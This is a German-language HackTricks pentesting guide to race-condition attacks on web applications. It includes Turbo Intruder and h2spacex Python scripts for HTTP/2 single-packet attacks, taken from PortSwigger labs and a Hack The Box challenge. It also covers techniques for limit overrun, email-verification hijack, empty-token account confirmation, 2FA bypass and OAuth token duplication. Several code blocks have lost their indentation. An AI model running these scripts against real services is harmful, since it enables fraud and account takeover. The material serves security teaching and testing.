# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Für ein tiefes Verständnis dieser Technik siehe den Originalreport unter [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Verbesserung von Race Condition-Angriffen

Das Hauptproblem beim Ausnutzen von Race Conditions besteht darin sicherzustellen, dass mehrere Requests gleichzeitig verarbeitet werden, mit **sehr geringen Unterschieden in ihren Verarbeitungszeiten — idealerweise weniger als 1ms**.

Im Folgenden finden Sie einige Techniken zum Synchronisieren von Anfragen:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Unterstützt das Senden von zwei Requests über eine einzige TCP-Verbindung, wodurch der Einfluss von Netzwerk-Jitter reduziert wird. Aufgrund serverseitiger Unterschiede reichen jedoch zwei Requests möglicherweise nicht aus, um einen konsistenten Race-Condition-Exploit zu erzielen.
- **HTTP/1.1 'Last-Byte Sync'**: Ermöglicht das Vorversenden der meisten Teile von 20–30 Requests und das Zurückhalten eines kleinen Fragments, das dann gemeinsam gesendet wird, wodurch eine gleichzeitige Ankunft am Server erreicht wird.

**Preparation for Last-Byte Sync** involves:

1. Header und Body-Daten ohne das letzte Byte senden, ohne den Stream zu beenden.
2. Nach dem ersten Senden eine Pause von 100 ms einlegen.
3. TCP_NODELAY deaktivieren, um Nagle's algorithm zum Bündeln der finalen Frames zu nutzen.
4. Pingen, um die Verbindung aufzuwärmen.

Das anschließende Senden der zurückgehaltenen Frames sollte dazu führen, dass sie in einem einzigen Paket ankommen, nachweisbar mit Wireshark. Diese Methode gilt nicht für statische Dateien, die normalerweise nicht bei RC-Angriffen verwendet werden.

### Anpassung an die Server-Architektur

Das Verständnis der Architektur des Ziels ist entscheidend. Frontend-Server können Requests unterschiedlich weiterleiten, was das Timing beeinflusst. Ein vorzeitiges serverseitiges Aufwärmen der Verbindung durch belanglose Requests kann das Request-Timing normalisieren.

#### Umgang mit sessionbasierter Sperrung

Frameworks wie PHP's session handler serialisieren Requests pro Session, was Schwachstellen verbergen kann. Die Nutzung unterschiedlicher session tokens für jede Anfrage kann dieses Problem umgehen.

#### Umgehen von Rate- oder Ressourcen-Limits

Wenn das Aufwärmen der Verbindung nicht wirksam ist, kann das gezielte Auslösen von Rate- oder Ressourcen-Limit-Verzögerungen des Webservers durch eine Flut von Dummy-Requests den single-packet attack erleichtern, indem eine serverseitige Verzögerung erzeugt wird, die für Race Conditions förderlich ist.

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Sie können die Anfrage an **Turbo intruder** senden (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), im Request den Wert ändern, den Sie für **`%s`** brute-forcen möchten, z. B. `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` und dann im Dropdown **`examples/race-single-packer-attack.py`** auswählen:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Wenn Sie unterschiedliche Werte senden möchten, können Sie den Code wie folgt anpassen, sodass eine Wortliste aus der Zwischenablage verwendet wird:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Wenn die Website HTTP2 nicht unterstützt (nur HTTP1.1), verwende `Engine.THREADED` oder `Engine.BURP` anstelle von `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: Wenn du einen request an 1 endpoint senden musst und anschließend mehrere an andere endpoints, um die RCE auszulösen, kannst du das Skript `race-single-packet-attack.py` wie folgt ändern:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Es ist auch in **Repeater** via der neuen '**Send group in parallel**' Option in Burp Suite verfügbar.
- Für **limit-overrun** kannst du einfach **same request 50 times** zur Gruppe hinzufügen.
- Für **connection warming** kannst du **add** am **beginning** der **group** einige **requests** an einen nicht-statischen Bereich des Webservers senden.
- Für **delaying** des Prozesses **between** der Verarbeitung **one request and another** in a 2 substates steps, könntest du **add extra requests between** beide **requests**.
- Für ein **multi-endpoint** RC könntest du damit beginnen, die **request** zu senden, die in den **hidden state** geht, und direkt danach **50 requests**, die **exploits the hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Das Ziel dieses Skripts ist es, die E-Mail eines Benutzers zu ändern und sie kontinuierlich zu verifizieren, bis das Verifizierungstoken der neuen E-Mail an die alte E-Mail geliefert wird (das passiert, weil im Code eine RC auftrat, bei der es möglich war, eine E-Mail zu ändern, aber die Verifizierung an die alte gesendet wurde, da die Variable, die die E-Mail angab, bereits mit der ersten gefüllt war).\
Wenn das Wort "objetivo" in den empfangenen E-Mails gefunden wird, wissen wir, dass wir das Verifizierungstoken der geänderten E-Mail erhalten haben, und beenden den Angriff.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Verbesserung des Single Packet Attack

In der ursprünglichen Forschung wird erklärt, dass dieser Angriff eine Grenze von 1.500 Bytes hat. Allerdings wurde in [**diesem Beitrag**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) erläutert, wie es möglich ist, die 1.500-Byte-Beschränkung des Single Packet Attack auf die **65.535 B Fensterbegrenzung von TCP durch Verwendung von Fragmentierung auf IP-Ebene** zu erweitern (ein einzelnes Packet in mehrere IP-Pakete aufzuteilen) und diese in unterschiedlicher Reihenfolge zu senden, wodurch das Reassemblieren des Packets verhindert wird, bis alle Fragmente den Server erreicht haben. Mit dieser Technik konnte der Forscher etwa 10.000 Requests in ca. 166 ms senden.

Beachte, dass obwohl diese Verbesserung den Angriff bei RC, die Hunderte/Tausende von Paketen erfordern, zuverlässiger macht, sie auch softwareseitige Einschränkungen haben kann. Einige populäre HTTP-Server wie Apache, Nginx und Go haben eine strikte `SETTINGS_MAX_CONCURRENT_STREAMS`-Einstellung von 100, 128 bzw. 250. Andere wie NodeJS und nghttp2 haben sie jedoch unbegrenzt.\
Das bedeutet im Grunde, dass Apache nur 100 HTTP connections von einer einzigen TCP connection berücksichtigt (was diesen RC-Angriff einschränkt).

You can find some examples using this tehcnique in the repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Before the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.

- **Repeater:** Siehe die Beispiele aus dem vorherigen Abschnitt.
- **Intruder**: Sende die **request** an **Intruder**, setze die **number of threads** auf **30** im **Options menu**, wähle als Payload **Null payloads** und generiere **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC-Methodik**

### Limit-overrun / TOCTOU

Dies ist der grundlegendste Typ von race condition, bei dem **Schwachstellen** an Stellen entstehen, die die **Anzahl der Ausführungen einer Aktion begrenzen**. Zum Beispiel die mehrfache Verwendung desselben Rabattcodes in einem Webshop. Ein sehr einfaches Beispiel findet sich in [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) oder in [**this bug**](https://hackerone.com/reports/759247)**.**

Es gibt viele Variationen dieses Angriffs, darunter:

- Eine Geschenkkarte mehrfach einlösen
- Ein Produkt mehrfach bewerten
- Bargeld abheben oder Überweisungen tätigen über den Kontostand hinaus
- Eine einzelne CAPTCHA-Lösung mehrfach verwenden
- Ein Anti-Brute-Force rate limit umgehen

### **Verborgene Subzustände**

Das Ausnutzen komplexer race conditions beinhaltet oft das Ausnutzen kurzer Gelegenheiten, um mit verborgenen oder **ungewollten Maschinensubzuständen** zu interagieren. So gehen Sie vor:

1. **Potenzielle verborgene Subzustände identifizieren**
- Beginnen Sie damit, Endpunkte zu identifizieren, die kritische Daten verändern oder damit interagieren, wie Benutzerprofile oder password reset processes. Konzentrieren Sie sich auf:
- **Storage**: Bevorzugen Sie Endpunkte, die serverseitig persistente Daten manipulieren, gegenüber solchen, die Daten clientseitig verarbeiten.
- **Action**: Suchen Sie nach Operationen, die bestehende Daten ändern, da diese eher ausnutzbare Zustände erzeugen als solche, die neue Daten hinzufügen.
- **Keying**: Erfolgreiche Angriffe beinhalten normalerweise Operationen, die auf denselben Identifier abstellen, z. B. username oder reset token.
2. **Erste Überprüfungen durchführen**
- Testen Sie die identifizierten Endpunkte mit race condition-Angriffen und beobachten Sie Abweichungen von den erwarteten Ergebnissen. Unerwartete Antworten oder Änderungen im Anwendungsverhalten können auf eine Schwachstelle hinweisen.
3. **Die Schwachstelle demonstrieren**
- Reduzieren Sie den Angriff auf die minimale Anzahl an Requests, die zum Ausnutzen der Schwachstelle nötig sind, oft nur zwei. Dieser Schritt kann aufgrund des präzisen Timings mehrere Versuche oder Automatisierung erfordern.

### Zeitkritische Angriffe

Präzises Timing von Requests kann Schwachstellen aufdecken, besonders wenn vorhersehbare Methoden wie timestamps für security tokens verwendet werden. Beispielsweise kann das Generieren von password reset tokens basierend auf timestamps identische tokens für simultane Requests ermöglichen.

**Zum Ausnutzen:**

- Verwenden Sie präzises Timing, z. B. einen single-packet Angriff, um gleichzeitige password reset requests zu senden. Identische tokens deuten auf eine Schwachstelle hin.

**Beispiel:**

- Fordern Sie zwei password reset tokens gleichzeitig an und vergleichen Sie sie. Übereinstimmende tokens deuten auf einen Fehler in der Token-Generierung hin.

**Schauen Sie sich** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **an, um dies auszuprobieren.**

## Fallstudien zu verborgenen Subzuständen

### Bezahlen & einen Artikel hinzufügen

Schauen Sie sich [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) an, um zu sehen, wie man in einem Shop **bezahlt** und einen extra Artikel **hinzufügt**, für den man **nicht bezahlen muss**.

### Andere E-Mails bestätigen

Die Idee ist, **eine E-Mail-Adresse zu verifizieren und sie gleichzeitig in eine andere zu ändern**, um herauszufinden, ob die Plattform die neue Adresse tatsächlich verifiziert.

### E-Mail auf 2 Adressen ändern — cookie-basiert

Laut [**this research**](https://portswigger.net/research/smashing-the-state-machine) war Gitlab auf diese Weise für eine Übernahme verwundbar, weil es möglicherweise **das E-Mail-Verifizierungs-Token einer Adresse an die andere E-Mail sendet**.

**Schauen Sie sich** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **an, um dies auszuprobieren.**

### Verborgene Datenbankzustände / Bestätigungs-Bypass

Wenn **2 verschiedene Schreibvorgänge** verwendet werden, um **Informationen** in eine **Datenbank** einzufügen, gibt es einen kurzen Zeitraum, in dem **nur die ersten Daten in der Datenbank geschrieben wurden**. Zum Beispiel, beim Erstellen eines Users könnten **username** und **password** geschrieben werden und erst danach wird **das token** zur Bestätigung des neu erstellten Accounts geschrieben. Das bedeutet, dass für kurze Zeit das **token zur Bestätigung eines Accounts null** ist.

Daher könnte das **Registrieren eines Accounts und das sofortige Senden mehrerer Requests mit einem leeren token** (`token=` oder `token[]=` oder eine andere Variation), um den Account sofort zu bestätigen, erlauben, einen Account zu **bestätigen**, dessen E-Mail man nicht kontrolliert.

**Schauen Sie sich** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **an, um dies auszuprobieren.**

### 2FA umgehen

Der folgende Pseudo-Code ist gegenüber race condition verwundbar, weil in einem sehr kurzen Zeitraum die **2FA nicht durchgesetzt** wird, während die Session erstellt wird:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 dauerhafte Persistenz

Es gibt mehrere [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Diese Dienste erlauben es Ihnen, eine Anwendung zu erstellen und Benutzer zu authentifizieren, die beim Provider registriert sind.\
Dazu muss der **client** Ihrer **application** gestatten, auf einige ihrer Daten beim **OAUth provider** zuzugreifen.\
Also, bis hierhin ist es einfach ein normales Login mit google/linkedin/github..., bei dem Ihnen eine Seite angezeigt wird, die sagt: "_Application \<InsertCoolName> möchte auf Ihre Informationen zugreifen, möchten Sie das erlauben?_" 

#### Race Condition in `authorization_code`

Das **Problem** tritt auf, wenn Sie es **akzeptieren** und automatisch ein **`authorization_code`** an die bösartige **application** gesendet wird. Dann missbraucht diese **application** eine Race Condition im OAUth-Service-Provider, um aus dem **`authorization_code`** mehrere AT/RT (_Authentication Token/Refresh Token_) für Ihr Konto zu erzeugen. Im Grunde nutzt sie die Tatsache aus, dass Sie der Anwendung den Zugriff auf Ihre Daten erlaubt haben, um **mehrere Accounts zu erstellen**. Wenn Sie die Berechtigungen für die Anwendung dann **entziehen**, wird ein Paar AT/RT gelöscht, aber die anderen bleiben weiterhin gültig.

#### Race Condition in `Refresh Token`

Sobald Sie ein **gültiges RT erhalten haben**, könnten Sie versuchen, es zu **missbrauchen, um mehrere AT/RT zu erzeugen**, und **selbst wenn der Benutzer die Berechtigungen** für die bösartige **application** zum Zugriff auf seine Daten widerruft, **bleiben mehrere RTs weiterhin gültig.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) finden Sie einen PoC in Java, um websocket-Nachrichten **parallel** zu senden und **Race Conditions auch in Web Sockets** auszunutzen.
- Mit Burp’s WebSocket Turbo Intruder können Sie die **THREADED**-Engine verwenden, um mehrere WS-Verbindungen zu starten und Payloads parallel zu senden. Starten Sie mit dem offiziellen Beispiel und passen Sie `config()` (Thread-Anzahl) für die Parallelität an; dies ist oft zuverlässiger als das Bündeln auf einer einzigen Verbindung, wenn serverseitiger Zustand über WS-Handler geraced wird. Siehe [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
